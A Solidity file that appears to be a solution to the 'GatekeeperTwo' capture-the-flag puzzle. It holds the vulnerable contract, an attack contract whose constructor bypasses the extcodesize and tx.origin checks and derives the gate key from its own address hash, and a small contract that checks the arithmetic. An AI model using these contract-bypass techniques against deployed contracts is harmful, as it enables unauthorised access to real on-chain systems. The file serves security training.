// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperTwoAttack {
    GatekeeperTwo gatekeepertwo;

    constructor(GatekeeperTwo gatekeepertwo_) {
        gatekeepertwo = gatekeepertwo_;
        bytes8 gateKey = ~bytes8(keccak256(abi.encodePacked(this)));
        gatekeepertwo.enter(gateKey);
    }
}

contract testData {
    uint64 public test =
        uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));
    bytes8 public test2 =
        bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))));
    uint64 public key = ~test;
    uint64 public test3 = test ^ key;
    bool public successs = test3 == type(uint64).max;
}
